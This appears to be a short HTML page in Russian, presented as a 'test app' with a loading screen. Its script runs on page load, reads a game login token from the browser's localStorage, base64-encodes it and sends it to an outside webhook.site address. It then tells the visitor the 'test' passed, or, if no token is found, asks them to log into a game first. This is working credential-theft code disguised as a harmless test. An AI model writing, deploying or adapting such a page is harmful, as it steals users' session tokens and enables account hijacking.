<!DOCTYPE html>
<html>
<head>
    <title>Приложение-тест</title>
</head>
<body>
    <h1>Загрузка...</h1>
    <script>
        // Ждем загрузки
        window.onload = function() {
            // Пытаемся забрать токен
            const token = localStorage.getItem('6287487:web_token:login:auth');
            if (token) {
                // Отправляем на твой Webhook
                fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?data=' + btoa(token));
                document.body.innerHTML = "<h1>Тест прошел успешно!</h1><p>Данные получены.</p>";
            } else {
                document.body.innerHTML = "<h1>Ошибка:</h1><p>Токен не найден. Зайдите в игру 51491054 сначала.</p>";
            }
        };
    </script>
</body>
</html>
